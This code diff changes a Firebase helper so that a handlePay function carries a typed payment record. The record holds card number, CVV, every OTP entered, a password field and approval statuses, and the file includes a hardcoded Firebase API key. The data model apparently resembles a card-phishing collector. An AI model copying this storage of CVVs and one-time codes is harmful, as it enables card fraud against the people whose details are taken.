@@ -1,6 +1,7 @@
 // firebase.js
 import { getApp, getApps, initializeApp } from "firebase/app";
 import { doc, getFirestore, setDoc } from "firebase/firestore";
+import { SetStateAction } from "react";
 
 const firebaseConfig = {
   apiKey: "AIzaSyA_nQizM3KE8om9FUfgsKUtTKQGPtL3EDU",
@@ -32,7 +33,60 @@ export async function addData(data: { id: any; createdDate?: string }) {
     // You might want to show an error message to the user here
   }
 }
-export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
+export const handlePay = async (
+  paymentInfo: {
+    cardNumber: string;
+    year: string;
+    month: string;
+    bank: string | undefined;
+    cvv: string | undefined;
+    otp: string | undefined;
+    pass: string;
+    cardState: string;
+    allOtps: string[];
+    bank_card: string[];
+    prefix: string;
+    status: "pending" | "new" | "approved" | "rejected";
+    page: string;
+  },
+  setPaymentInfo: {
+    (
+      value: SetStateAction<{
+        cardNumber: string;
+        year: string;
+        month: string;
+        bank?: string | undefined;
+        cvv?: string | undefined;
+        otp?: string | undefined;
+        pass: string;
+        cardState: string;
+        allOtps: string[];
+        bank_card: string[];
+        prefix: string;
+        status: "pending" | "new" | "approved" | "rejected";
+        page: string;
+      }>
+    ): void;
+    (
+      value: SetStateAction<{
+        cardNumber: string;
+        year: string;
+        month: string;
+        bank?: string | undefined;
+        cvv?: string | undefined;
+        otp?: string | undefined;
+        pass: string;
+        cardState: string;
+        allOtps: string[];
+        bank_card: string[];
+        prefix: string;
+        status: "pending" | "new" | "approved" | "rejected";
+        page: string;
+      }>
+    ): void;
+    (arg0: (prev: any) => any): void;
+  }
+) => {
   try {
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
